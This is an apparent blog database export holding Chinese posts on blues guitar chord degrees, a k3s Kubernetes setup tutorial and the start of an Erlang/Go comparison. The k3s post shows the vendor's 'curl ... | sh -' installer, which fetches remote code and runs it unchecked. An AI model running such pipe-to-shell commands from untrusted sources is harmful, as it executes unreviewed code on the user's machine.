Theory看了几章，但是如果真的要练习的话。Jazz练习还是有点难度。很多都是从blues开始练习的，所以转变一下方向。比较blues更加偏流行一点。更加容易上手。</p>\n<p>当然也就是找一些教材和视频，然后自己学习了。趁现在有些时间。</p>\n<p>视频在youtube上很好找，我觉不要找那种everyone must know；top 10 之类的就好了。很多视频都让我有所长进。</p>\n<p>教材主要有一个叫<code>Blues Guitar with Steve Krenz</code>这个比较全面。还有一个<code>ultimate blues guitar cheat sheet</code>这个比较理论一些。</p>\n<h2 id=\"和弦级数\"><a href=\"#和弦级数\" class=\"headerlink\" title=\"和弦级数\"></a>和弦级数</h2><p>首先引入一下和弦级数吧。这些书都默认读者有扎实的乐理了。一个简单粗暴的图，仅用来参考。</p>\n<p><img src=\"https://i.loli.net/2019/03/20/5c920d33c2b94.jpg\" alt=\"记忆图\"></p>\n<blockquote>\n<p>和弦的级数，其实就是和弦跟音在和弦所在调内音阶上的级数。</p>\n</blockquote>\n<p>同一个和弦，在不同的调内，其级数是不同的，比如C和弦，在C大调内就是一级和弦，在G大调内，就是4级和弦;在F调内，就是5级和弦。</p>\n<p>判断一个和弦，在某一个调内的级数，除了根据其根音在调内音阶的音级外，最主要的还要判断一下，这个和弦是不是“调内和弦” — 即和弦的构成音都是在调内的正统音级。</p>\n<ul>\n<li><p>比如D和弦对于C大调来说，就不是调内和弦，因为D和弦的三音#F，在C音阶上，是升四级，而非正四级。所以对于一个调的音阶，除了了解其每个正统音级上的乐音外，还要清楚的了解，在这个音级上可以构建什么样的和弦。</p>\n</li>\n<li><p>以自然大音阶为例，在音阶的第一、第四、第五自然音级上构建的三和弦，都是大三和弦，就是正三和弦；在第二，第四，第六自然音阶上构建的和弦都是小三和弦。最后在第七音级上构建的三和弦，则是个减三和弦。</p>\n</li>\n<li><p>同理，关于七和弦。在第一、第四音级上构建的七和弦，都是大大七和弦；第五音级上构建的七和弦是大小七和弦；在第二、第三、第六音级上构建的七和弦，都是小小七和弦；第七音级上构建的七和弦是半减七和弦。</p>\n</li>\n</ul>\n<p>所以，当看到一个大三和弦的时候，如作为“调内和弦”，则它只可能出现在大调的一，四，五这三个音级上，如果它的根音出现在某调的其他音级上，则必然不是该调的调内和弦。</p>\n<p>对于大调而言，如果一个大三和弦的根音音名与调名一样，则它必然是该调一级和弦；如与调名成纯四度音程关系，则是四级和弦；纯五度则是五级和弦。</p>\n<p>小三和弦一样，看根音与调名之间音程关系。上方大二度就是二级，上方大三度就是三级，下方小三度就是六级。</p>\n<p>诸如此类</p>\n<h2 id=\"Getting-Start-Your-Blues\"><a href=\"#Getting-Start-Your-Blues\" class=\"headerlink\" title=\"Getting Start Your Blues\"></a>Getting Start Your Blues</h2><p>现在的各类教程和教材都已经是overwhelming了。没必要都用和参考，两个不同的教材和教程，已经足够。这就是对抗。就像GAN一样。adversarial我们的材料。同时我也需要记住，没有能够马上就是riff一段大师级的blues/jazz。slow and steady wins the race。 </p>\n<p>毕竟是业余时间来学习，只是现在正好时间充沛了一些。所以这些lessons只是一些临时的工具让我们发展我们的音感。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"intro\"><a href=\"#intro\" class=\"headerlink\" title=\"intro\"></a>intro</h2><p>Jazz Theory看了几章，但是如果真的要练习的话。Jazz练习还是有点难度。很多都是从blues开始练习的，所以转变一下方向。比较blues更加偏流行一点。更加容易上手。</p>\n<p>当然也就是找一些教材和视频，然后自己学习了。趁现在有些时间。</p>\n<p>视频在youtube上很好找，我觉不要找那种everyone must know；top 10 之类的就好了。很多视频都让我有所长进。</p>\n<p>教材主要有一个叫<code>Blues Guitar with Steve Krenz</code>这个比较全面。还有一个<code>ultimate blues guitar cheat sheet</code>这个比较理论一些。</p>\n<h2 id=\"和弦级数\"><a href=\"#和弦级数\" class=\"headerlink\" title=\"和弦级数\"></a>和弦级数</h2><p>首先引入一下和弦级数吧。这些书都默认读者有扎实的乐理了。一个简单粗暴的图，仅用来参考。</p>\n<p><img src=\"https://i.loli.net/2019/03/20/5c920d33c2b94.jpg\" alt=\"记忆图\"></p>\n<blockquote>\n<p>和弦的级数，其实就是和弦跟音在和弦所在调内音阶上的级数。</p>\n</blockquote>\n<p>同一个和弦，在不同的调内，其级数是不同的，比如C和弦，在C大调内就是一级和弦，在G大调内，就是4级和弦;在F调内，就是5级和弦。</p>\n<p>判断一个和弦，在某一个调内的级数，除了根据其根音在调内音阶的音级外，最主要的还要判断一下，这个和弦是不是“调内和弦” — 即和弦的构成音都是在调内的正统音级。</p>\n<ul>\n<li><p>比如D和弦对于C大调来说，就不是调内和弦，因为D和弦的三音#F，在C音阶上，是升四级，而非正四级。所以对于一个调的音阶，除了了解其每个正统音级上的乐音外，还要清楚的了解，在这个音级上可以构建什么样的和弦。</p>\n</li>\n<li><p>以自然大音阶为例，在音阶的第一、第四、第五自然音级上构建的三和弦，都是大三和弦，就是正三和弦；在第二，第四，第六自然音阶上构建的和弦都是小三和弦。最后在第七音级上构建的三和弦，则是个减三和弦。</p>\n</li>\n<li><p>同理，关于七和弦。在第一、第四音级上构建的七和弦，都是大大七和弦；第五音级上构建的七和弦是大小七和弦；在第二、第三、第六音级上构建的七和弦，都是小小七和弦；第七音级上构建的七和弦是半减七和弦。</p>\n</li>\n</ul>\n<p>所以，当看到一个大三和弦的时候，如作为“调内和弦”，则它只可能出现在大调的一，四，五这三个音级上，如果它的根音出现在某调的其他音级上，则必然不是该调的调内和弦。</p>\n<p>对于大调而言，如果一个大三和弦的根音音名与调名一样，则它必然是该调一级和弦；如与调名成纯四度音程关系，则是四级和弦；纯五度则是五级和弦。</p>\n<p>小三和弦一样，看根音与调名之间音程关系。上方大二度就是二级，上方大三度就是三级，下方小三度就是六级。</p>\n<p>诸如此类</p>\n<h2 id=\"Getting-Start-Your-Blues\"><a href=\"#Getting-Start-Your-Blues\" class=\"headerlink\" title=\"Getting Start Your Blues\"></a>Getting Start Your Blues</h2><p>现在的各类教程和教材都已经是overwhelming了。没必要都用和参考，两个不同的教材和教程，已经足够。这就是对抗。就像GAN一样。adversarial我们的材料。同时我也需要记住，没有能够马上就是riff一段大师级的blues/jazz。slow and steady wins the race。 </p>\n<p>毕竟是业余时间来学习，只是现在正好时间充沛了一些。所以这些lessons只是一些临时的工具让我们发展我们的音感。</p>\n"},{"layout":"title","title":"k3s-轻量级Kubernetes上手","date":"2019-03-09T22:48:27.000Z","_content":"\n## intro\n\nk3s已经发布了几天时间，趁着手头的Vultr优惠券还没有过期，正好可以开几台机器尝试一下这个很热门的新项目。\n\n这个项目是RancherLab所开发的，之前使用k8s和swarm的时候也用过不少rancher，对其很方便的图形化容器管理感到很惊艳。感觉rancher和k8s其实应该算是竞争关系。rancher的两个版本都提供容器编排和调度，但是k8s的社区发展的越来越强大，rancher慢慢变成算是提供k8s的上层服务了，通过rancher管理多个k8s。\n\n好了vultr上的机器开好了，使用Ubuntu 18.04 x64 的快照，之前预装了docker之类的工具。虽然开了三台机器，不过首先还是试试单机的k3s吧。\n\n通过github的项目repo找到Readme先了解一下：https://github.com/rancher/k3s\n\n## Quick Start\n\nk3s已经使用了containerd替换Docker来做runtime，所以我们可以在RancherOS停止Docker。containerd本身就是Docker的一部分，完全兼容我们所熟悉的Docker。\n\n官网提供了两种方法，一种就是下载下载repo的release然后自行安装\n```\ncd /opt && wget https://github.com/rancher/k3s/releases/download/v0.2.0/k3s\nchmod +x k3s && ./k3s server &\n```\n另外一种是通过类似于getdocker之类的官方脚本\n\n```\ncurl -sfL https://get.k3s.io | sh -\n```\n我们试试第二种\n```\n[INFO]  Finding latest release\n[INFO]  Using v0.2.0 as release\n[INFO]  Downloading hash https://github.com/rancher/k3s/releases/download/v0.2.0/sha256sum-amd64.txt\n[INFO]  Downloading binary https://github.com/rancher/k3s/releases/download/v0.2.0/k3s\n[INFO]  Verifying binary download\n[INFO]  Installing k3s to /usr/local/bin/k3s\n[INFO]  Creating /usr/local/bin/kubectl symlink to k3s\n[INFO]  Creating /usr/local/bin/crictl symlink to k3s\n[INFO]  Creating uninstall script /usr/local/bin/k3s-uninstall.sh\n[INFO]  systemd: Creating environment file /etc/systemd/system/k3s.service.env\n[INFO]  systemd: Creating service file /etc/systemd/system/k3s.service\n[INFO]  systemd: Enabling k3s unit\nCreated symlink /etc/systemd/system/multi-user.target.wants/k3s.service → /etc/systemd/system/k3s.service.\n[INFO]  systemd: Starting k3s\n```\n当起了k3s之后检查一下`netstat -tnlp`，我们可以发现k3s一并起了多个端口6444/6445应该是主程序，因为再起一次会提示端口占用，还有10010的containerd，以及10248到10252等几个未知服务。\n\n之前网上搜一搜k3s的信息，发现都是起亚k3s的车[lol]。\n\n这样启动的k3s会自带agent，也就是kubernetes的节点，使用`k3s server --disable-agent`来起k3s就可以单纯的将其作为server。\n\n接下来尝试一下添加deployment。\n\n我们使用官方提供的yaml template\n\n```\nk3s kubectl create -f https://kubernetes.io/docs/user-guide/nginx-deployment.yaml\n```\n\n通过`k3s kubectl get deployment`和`k3s kubectl get pods`查看创建的pods\n\n\n## node\n如果我们需要添加agent呢，添加一个node？\n\n首先查看一下原来的node`k3s kubectl get node`拿到的是\n\n```\nNAME          STATUS   ROLES    AGE   VERSION\nvultr.guest   Ready    <none>   11d   v1.13.4-k3s.1\n```\n\n然后需要拿到机器上的node token，位置在`/var/lib/rancher/k3s/server/node-token`\n\n拿到之后使用，来加入node。\n\n```\nk3s agent -s ${YOUR_SERVER_IP} -t ${NODE_TOKEN}\n```\n\n但是发现一个问题，vultr的机器是默认没有开通LAN的或者是硬件配有配置好。\n\n比如这里用的是ubuntu的机器，我们需要自己添加LAN的固件。ubuntu 18的网卡配置需要创建一个10-ens7.yaml的文件在`/etc/netplan/`的目录下\n```\nnetwork:\n  version: 2\n  renderer: networkd\n  ethernets:\n    ens7:\n       match:\n         macaddress: 56:00:01:f2:8e:fb\n       mtu: 1450\n       dhcp4: no\n       addresses: [10.8.96.4/16]\n```\n\n其中addresses，就是vultr提供的private netowrk地址，使用`netplan apply`来配置设置。\n\n配置之后可以试一试能不能够ping通关联的机器。也可能需要重启类配置。\n\n这样多节点的k3s部署好了，就像swarm一样方便感觉。之后再尝试部署一些复杂的应用吧。\n\n### Reference \n\n+ https://github.com/rancher/k3s\n","source":"_posts/k3s-轻量级Kubernetes上手.md","raw":"---\nlayout: title\ntitle: k3s-轻量级Kubernetes上手\ndate: 2019-03-09 16:48:27\ntags: Kubernetes\ncategories: Tech\n---\n\n## intro\n\nk3s已经发布了几天时间，趁着手头的Vultr优惠券还没有过期，正好可以开几台机器尝试一下这个很热门的新项目。\n\n这个项目是RancherLab所开发的，之前使用k8s和swarm的时候也用过不少rancher，对其很方便的图形化容器管理感到很惊艳。感觉rancher和k8s其实应该算是竞争关系。rancher的两个版本都提供容器编排和调度，但是k8s的社区发展的越来越强大，rancher慢慢变成算是提供k8s的上层服务了，通过rancher管理多个k8s。\n\n好了vultr上的机器开好了，使用Ubuntu 18.04 x64 的快照，之前预装了docker之类的工具。虽然开了三台机器，不过首先还是试试单机的k3s吧。\n\n通过github的项目repo找到Readme先了解一下：https://github.com/rancher/k3s\n\n## Quick Start\n\nk3s已经使用了containerd替换Docker来做runtime，所以我们可以在RancherOS停止Docker。containerd本身就是Docker的一部分，完全兼容我们所熟悉的Docker。\n\n官网提供了两种方法，一种就是下载下载repo的release然后自行安装\n```\ncd /opt && wget https://github.com/rancher/k3s/releases/download/v0.2.0/k3s\nchmod +x k3s && ./k3s server &\n```\n另外一种是通过类似于getdocker之类的官方脚本\n\n```\ncurl -sfL https://get.k3s.io | sh -\n```\n我们试试第二种\n```\n[INFO]  Finding latest release\n[INFO]  Using v0.2.0 as release\n[INFO]  Downloading hash https://github.com/rancher/k3s/releases/download/v0.2.0/sha256sum-amd64.txt\n[INFO]  Downloading binary https://github.com/rancher/k3s/releases/download/v0.2.0/k3s\n[INFO]  Verifying binary download\n[INFO]  Installing k3s to /usr/local/bin/k3s\n[INFO]  Creating /usr/local/bin/kubectl symlink to k3s\n[INFO]  Creating /usr/local/bin/crictl symlink to k3s\n[INFO]  Creating uninstall script /usr/local/bin/k3s-uninstall.sh\n[INFO]  systemd: Creating environment file /etc/systemd/system/k3s.service.env\n[INFO]  systemd: Creating service file /etc/systemd/system/k3s.service\n[INFO]  systemd: Enabling k3s unit\nCreated symlink /etc/systemd/system/multi-user.target.wants/k3s.service → /etc/systemd/system/k3s.service.\n[INFO]  systemd: Starting k3s\n```\n当起了k3s之后检查一下`netstat -tnlp`，我们可以发现k3s一并起了多个端口6444/6445应该是主程序，因为再起一次会提示端口占用，还有10010的containerd，以及10248到10252等几个未知服务。\n\n之前网上搜一搜k3s的信息，发现都是起亚k3s的车[lol]。\n\n这样启动的k3s会自带agent，也就是kubernetes的节点，使用`k3s server --disable-agent`来起k3s就可以单纯的将其作为server。\n\n接下来尝试一下添加deployment。\n\n我们使用官方提供的yaml template\n\n```\nk3s kubectl create -f https://kubernetes.io/docs/user-guide/nginx-deployment.yaml\n```\n\n通过`k3s kubectl get deployment`和`k3s kubectl get pods`查看创建的pods\n\n\n## node\n如果我们需要添加agent呢，添加一个node？\n\n首先查看一下原来的node`k3s kubectl get node`拿到的是\n\n```\nNAME          STATUS   ROLES    AGE   VERSION\nvultr.guest   Ready    <none>   11d   v1.13.4-k3s.1\n```\n\n然后需要拿到机器上的node token，位置在`/var/lib/rancher/k3s/server/node-token`\n\n拿到之后使用，来加入node。\n\n```\nk3s agent -s ${YOUR_SERVER_IP} -t ${NODE_TOKEN}\n```\n\n但是发现一个问题，vultr的机器是默认没有开通LAN的或者是硬件配有配置好。\n\n比如这里用的是ubuntu的机器，我们需要自己添加LAN的固件。ubuntu 18的网卡配置需要创建一个10-ens7.yaml的文件在`/etc/netplan/`的目录下\n```\nnetwork:\n  version: 2\n  renderer: networkd\n  ethernets:\n    ens7:\n       match:\n         macaddress: 56:00:01:f2:8e:fb\n       mtu: 1450\n       dhcp4: no\n       addresses: [10.8.96.4/16]\n```\n\n其中addresses，就是vultr提供的private netowrk地址，使用`netplan apply`来配置设置。\n\n配置之后可以试一试能不能够ping通关联的机器。也可能需要重启类配置。\n\n这样多节点的k3s部署好了，就像swarm一样方便感觉。之后再尝试部署一些复杂的应用吧。\n\n### Reference \n\n+ https://github.com/rancher/k3s\n","slug":"k3s-轻量级Kubernetes上手","published":1,"updated":"2019-03-25T03:43:07.360Z","comments":1,"photos":[],"link":"","_id":"ckkljsasp001zr242i4hi5a46","content":"<h2 id=\"intro\"><a href=\"#intro\" class=\"headerlink\" title=\"intro\"></a>intro</h2><p>k3s已经发布了几天时间，趁着手头的Vultr优惠券还没有过期，正好可以开几台机器尝试一下这个很热门的新项目。</p>\n<p>这个项目是RancherLab所开发的，之前使用k8s和swarm的时候也用过不少rancher，对其很方便的图形化容器管理感到很惊艳。感觉rancher和k8s其实应该算是竞争关系。rancher的两个版本都提供容器编排和调度，但是k8s的社区发展的越来越强大，rancher慢慢变成算是提供k8s的上层服务了，通过rancher管理多个k8s。</p>\n<p>好了vultr上的机器开好了，使用Ubuntu 18.04 x64 的快照，之前预装了docker之类的工具。虽然开了三台机器，不过首先还是试试单机的k3s吧。</p>\n<p>通过github的项目repo找到Readme先了解一下：<a href=\"https://github.com/rancher/k3s\" target=\"_blank\" rel=\"external\">https://github.com/rancher/k3s</a></p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><p>k3s已经使用了containerd替换Docker来做runtime，所以我们可以在RancherOS停止Docker。containerd本身就是Docker的一部分，完全兼容我们所熟悉的Docker。</p>\n<p>官网提供了两种方法，一种就是下载下载repo的release然后自行安装<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /opt &amp;&amp; wget https://github.com/rancher/k3s/releases/download/v0.2.0/k3s</span><br><span class=\"line\">chmod +x k3s &amp;&amp; ./k3s server &amp;</span><br></pre></td></tr></table></figure></p>\n<p>另外一种是通过类似于getdocker之类的官方脚本</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -sfL https://get.k3s.io | sh -</span><br></pre></td></tr></table></figure>\n<p>我们试试第二种<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[INFO]  Finding latest release</span><br><span class=\"line\">[INFO]  Using v0.2.0 as release</span><br><span class=\"line\">[INFO]  Downloading hash https://github.com/rancher/k3s/releases/download/v0.2.0/sha256sum-amd64.txt</span><br><span class=\"line\">[INFO]  Downloading binary https://github.com/rancher/k3s/releases/download/v0.2.0/k3s</span><br><span class=\"line\">[INFO]  Verifying binary download</span><br><span class=\"line\">[INFO]  Installing k3s to /usr/local/bin/k3s</span><br><span class=\"line\">[INFO]  Creating /usr/local/bin/kubectl symlink to k3s</span><br><span class=\"line\">[INFO]  Creating /usr/local/bin/crictl symlink to k3s</span><br><span class=\"line\">[INFO]  Creating uninstall script /usr/local/bin/k3s-uninstall.sh</span><br><span class=\"line\">[INFO]  systemd: Creating environment file /etc/systemd/system/k3s.service.env</span><br><span class=\"line\">[INFO]  systemd: Creating service file /etc/systemd/system/k3s.service</span><br><span class=\"line\">[INFO]  systemd: Enabling k3s unit</span><br><span class=\"line\">Created symlink /etc/systemd/system/multi-user.target.wants/k3s.service → /etc/systemd/system/k3s.service.</span><br><span class=\"line\">[INFO]  systemd: Starting k3s</span><br></pre></td></tr></table></figure></p>\n<p>当起了k3s之后检查一下<code>netstat -tnlp</code>，我们可以发现k3s一并起了多个端口6444/6445应该是主程序，因为再起一次会提示端口占用，还有10010的containerd，以及10248到10252等几个未知服务。</p>\n<p>之前网上搜一搜k3s的信息，发现都是起亚k3s的车[lol]。</p>\n<p>这样启动的k3s会自带agent，也就是kubernetes的节点，使用<code>k3s server --disable-agent</code>来起k3s就可以单纯的将其作为server。</p>\n<p>接下来尝试一下添加deployment。</p>\n<p>我们使用官方提供的yaml template</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">k3s kubectl create -f https://kubernetes.io/docs/user-guide/nginx-deployment.yaml</span><br></pre></td></tr></table></figure>\n<p>通过<code>k3s kubectl get deployment</code>和<code>k3s kubectl get pods</code>查看创建的pods</p>\n<h2 id=\"node\"><a href=\"#node\" class=\"headerlink\" title=\"node\"></a>node</h2><p>如果我们需要添加agent呢，添加一个node？</p>\n<p>首先查看一下原来的node<code>k3s kubectl get node</code>拿到的是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NAME          STATUS   ROLES    AGE   VERSION</span><br><span class=\"line\">vultr.guest   Ready    &lt;none&gt;   11d   v1.13.4-k3s.1</span><br></pre></td></tr></table></figure>\n<p>然后需要拿到机器上的node token，位置在<code>/var/lib/rancher/k3s/server/node-token</code></p>\n<p>拿到之后使用，来加入node。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">k3s agent -s $&#123;YOUR_SERVER_IP&#125; -t $&#123;NODE_TOKEN&#125;</span><br></pre></td></tr></table></figure>\n<p>但是发现一个问题，vultr的机器是默认没有开通LAN的或者是硬件配有配置好。</p>\n<p>比如这里用的是ubuntu的机器，我们需要自己添加LAN的固件。ubuntu 18的网卡配置需要创建一个10-ens7.yaml的文件在<code>/etc/netplan/</code>的目录下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">network:</span><br><span class=\"line\">  version: 2</span><br><span class=\"line\">  renderer: networkd</span><br><span class=\"line\">  ethernets:</span><br><span class=\"line\">    ens7:</span><br><span class=\"line\">       match:</span><br><span class=\"line\">         macaddress: 56:00:01:f2:8e:fb</span><br><span class=\"line\">       mtu: 1450</span><br><span class=\"line\">       dhcp4: no</span><br><span class=\"line\">       addresses: [10.8.96.4/16]</span><br></pre></td></tr></table></figure></p>\n<p>其中addresses，就是vultr提供的private netowrk地址，使用<code>netplan apply</code>来配置设置。</p>\n<p>配置之后可以试一试能不能够ping通关联的机器。也可能需要重启类配置。</p>\n<p>这样多节点的k3s部署好了，就像swarm一样方便感觉。之后再尝试部署一些复杂的应用吧。</p>\n<h3 id=\"Reference\"><a href=\"#Reference\" class=\"headerlink\" title=\"Reference\"></a>Reference</h3><ul>\n<li><a href=\"https://github.com/rancher/k3s\" target=\"_blank\" rel=\"external\">https://github.com/rancher/k3s</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"intro\"><a href=\"#intro\" class=\"headerlink\" title=\"intro\"></a>intro</h2><p>k3s已经发布了几天时间，趁着手头的Vultr优惠券还没有过期，正好可以开几台机器尝试一下这个很热门的新项目。</p>\n<p>这个项目是RancherLab所开发的，之前使用k8s和swarm的时候也用过不少rancher，对其很方便的图形化容器管理感到很惊艳。感觉rancher和k8s其实应该算是竞争关系。rancher的两个版本都提供容器编排和调度，但是k8s的社区发展的越来越强大，rancher慢慢变成算是提供k8s的上层服务了，通过rancher管理多个k8s。</p>\n<p>好了vultr上的机器开好了，使用Ubuntu 18.04 x64 的快照，之前预装了docker之类的工具。虽然开了三台机器，不过首先还是试试单机的k3s吧。</p>\n<p>通过github的项目repo找到Readme先了解一下：<a href=\"https://github.com/rancher/k3s\">https://github.com/rancher/k3s</a></p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><p>k3s已经使用了containerd替换Docker来做runtime，所以我们可以在RancherOS停止Docker。containerd本身就是Docker的一部分，完全兼容我们所熟悉的Docker。</p>\n<p>官网提供了两种方法，一种就是下载下载repo的release然后自行安装<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /opt &amp;&amp; wget https://github.com/rancher/k3s/releases/download/v0.2.0/k3s</span><br><span class=\"line\">chmod +x k3s &amp;&amp; ./k3s server &amp;</span><br></pre></td></tr></table></figure></p>\n<p>另外一种是通过类似于getdocker之类的官方脚本</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -sfL https://get.k3s.io | sh -</span><br></pre></td></tr></table></figure>\n<p>我们试试第二种<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[INFO]  Finding latest release</span><br><span class=\"line\">[INFO]  Using v0.2.0 as release</span><br><span class=\"line\">[INFO]  Downloading hash https://github.com/rancher/k3s/releases/download/v0.2.0/sha256sum-amd64.txt</span><br><span class=\"line\">[INFO]  Downloading binary https://github.com/rancher/k3s/releases/download/v0.2.0/k3s</span><br><span class=\"line\">[INFO]  Verifying binary download</span><br><span class=\"line\">[INFO]  Installing k3s to /usr/local/bin/k3s</span><br><span class=\"line\">[INFO]  Creating /usr/local/bin/kubectl symlink to k3s</span><br><span class=\"line\">[INFO]  Creating /usr/local/bin/crictl symlink to k3s</span><br><span class=\"line\">[INFO]  Creating uninstall script /usr/local/bin/k3s-uninstall.sh</span><br><span class=\"line\">[INFO]  systemd: Creating environment file /etc/systemd/system/k3s.service.env</span><br><span class=\"line\">[INFO]  systemd: Creating service file /etc/systemd/system/k3s.service</span><br><span class=\"line\">[INFO]  systemd: Enabling k3s unit</span><br><span class=\"line\">Created symlink /etc/systemd/system/multi-user.target.wants/k3s.service → /etc/systemd/system/k3s.service.</span><br><span class=\"line\">[INFO]  systemd: Starting k3s</span><br></pre></td></tr></table></figure></p>\n<p>当起了k3s之后检查一下<code>netstat -tnlp</code>，我们可以发现k3s一并起了多个端口6444/6445应该是主程序，因为再起一次会提示端口占用，还有10010的containerd，以及10248到10252等几个未知服务。</p>\n<p>之前网上搜一搜k3s的信息，发现都是起亚k3s的车[lol]。</p>\n<p>这样启动的k3s会自带agent，也就是kubernetes的节点，使用<code>k3s server --disable-agent</code>来起k3s就可以单纯的将其作为server。</p>\n<p>接下来尝试一下添加deployment。</p>\n<p>我们使用官方提供的yaml template</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">k3s kubectl create -f https://kubernetes.io/docs/user-guide/nginx-deployment.yaml</span><br></pre></td></tr></table></figure>\n<p>通过<code>k3s kubectl get deployment</code>和<code>k3s kubectl get pods</code>查看创建的pods</p>\n<h2 id=\"node\"><a href=\"#node\" class=\"headerlink\" title=\"node\"></a>node</h2><p>如果我们需要添加agent呢，添加一个node？</p>\n<p>首先查看一下原来的node<code>k3s kubectl get node</code>拿到的是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NAME          STATUS   ROLES    AGE   VERSION</span><br><span class=\"line\">vultr.guest   Ready    &lt;none&gt;   11d   v1.13.4-k3s.1</span><br></pre></td></tr></table></figure>\n<p>然后需要拿到机器上的node token，位置在<code>/var/lib/rancher/k3s/server/node-token</code></p>\n<p>拿到之后使用，来加入node。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">k3s agent -s $&#123;YOUR_SERVER_IP&#125; -t $&#123;NODE_TOKEN&#125;</span><br></pre></td></tr></table></figure>\n<p>但是发现一个问题，vultr的机器是默认没有开通LAN的或者是硬件配有配置好。</p>\n<p>比如这里用的是ubuntu的机器，我们需要自己添加LAN的固件。ubuntu 18的网卡配置需要创建一个10-ens7.yaml的文件在<code>/etc/netplan/</code>的目录下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">network:</span><br><span class=\"line\">  version: 2</span><br><span class=\"line\">  renderer: networkd</span><br><span class=\"line\">  ethernets:</span><br><span class=\"line\">    ens7:</span><br><span class=\"line\">       match:</span><br><span class=\"line\">         macaddress: 56:00:01:f2:8e:fb</span><br><span class=\"line\">       mtu: 1450</span><br><span class=\"line\">       dhcp4: no</span><br><span class=\"line\">       addresses: [10.8.96.4/16]</span><br></pre></td></tr></table></figure></p>\n<p>其中addresses，就是vultr提供的private netowrk地址，使用<code>netplan apply</code>来配置设置。</p>\n<p>配置之后可以试一试能不能够ping通关联的机器。也可能需要重启类配置。</p>\n<p>这样多节点的k3s部署好了，就像swarm一样方便感觉。之后再尝试部署一些复杂的应用吧。</p>\n<h3 id=\"Reference\"><a href=\"#Reference\" class=\"headerlink\" title=\"Reference\"></a>Reference</h3><ul>\n<li><a href=\"https://github.com/rancher/k3s\">https://github.com/rancher/k3s</a></li>\n</ul>\n"},{"layout":"title","title":"Programming language for Distribute System","date":"2018-02-10T03:19:15.000Z","_content":"## 1. Erlang\n[Erlang][1], as described by [Wikipedia][2]:\n\n> It was designed by Ericsson to support distributed, fault-tolerant, soft-real-time, non-stop applications.\n\nYou might also want to read the [*Distributed Erlang*][3] section of their manual.\n\nHowever, note that Erlang is a [*functional* language][4] and will require a much different paradigm of thought as compared to C++.\n\n> A distributed Erlang system consists of a number of Erlang runtime systems communicating with each other. Each such runtime system is called a node. Message passing between processes at different nodes, as well as links and monitors, are transparent when pids are used. Registered names, however, are local to each node. This means that the node must be specified as well when sending messages, and so on, using registered names.\n\n\n\n\n\n\n## 2. Golang\nGoLang from Google is a pretty new language. It seems that among its many attributes, it may some day be suitable for large distributed systems requiring a lot of message queues to achieve scalable consistent and reliable behaviours, at least according to [these folks][5] at heroku.\n\nGo seems to be focused on concurrency issues, threading primitives in the language, and so on, and this is perhaps a necessary-but-not-quite-sufficient starting point for distributed systems. Perhaps their thoughts will be helpful to you. I wouldn't call Go-lang's support for distributed systems \"first-class\", but rather, say that it would be possible to build a first class distributed-systems framework using Go's library and language primitives.\n\nAt first, I'm less impressed with Go. 